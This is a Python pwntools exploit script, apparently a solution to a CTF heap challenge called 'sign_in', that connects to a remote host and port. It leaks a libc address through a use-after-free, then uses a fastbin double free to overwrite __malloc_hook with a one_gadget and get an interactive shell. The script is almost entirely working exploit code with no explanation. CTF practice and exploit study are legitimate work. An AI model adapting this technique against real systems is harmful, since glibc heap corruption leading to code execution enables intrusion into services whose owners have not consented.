# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './sign_in'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '183.129.189.60'
    port = '10050'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , name ='a', msg='a'):
    cmd(1)
    sla('size of the game\'s name:',size)
    sla('game\'s name:',name)
    sla('message',msg)

def delete(idx):
    cmd(3)
    sla('index:' , idx)

def show():
    cmd(2)

one_gad = one_gadget(libc.path)

ptr_list = 0x0000000002020C0

def attack():

    add(0x88 , 'a' , 'a')
    add(0x28 , 'a' , 'a')

    delete(0)
    delete(1)
    add(0x88)
    delete(0)
    show()

    __malloc_hook = l64() - 0x68
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    realloc_addr = libc.sym['realloc']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    ogg = one_gad[3] + libc.address
    lg('__malloc_hook',__malloc_hook)

    add(0x68 ) #4
    add(0x68 ) #5
    delete(3)
    delete(4)
    delete(3)
    add(0x68 , p64(__malloc_hook - 0x23) , p64(__malloc_hook - 0x23))
    add(0x68)
    add(0x68)
    payload = 'a'*11 + p64(ogg) + p64(realloc_addr +4)
    add(0x68 ,payload , payload)
    # dbg('malloc')
    cmd(1)

    # dbg()

    # sl('echo shell')
    # rl('shell')
    p.interactive()

attack()

'''
@File    :   sign_in.py
@Time    :   2021/10/14 12:02:22
@Author  :   Niyah 
'''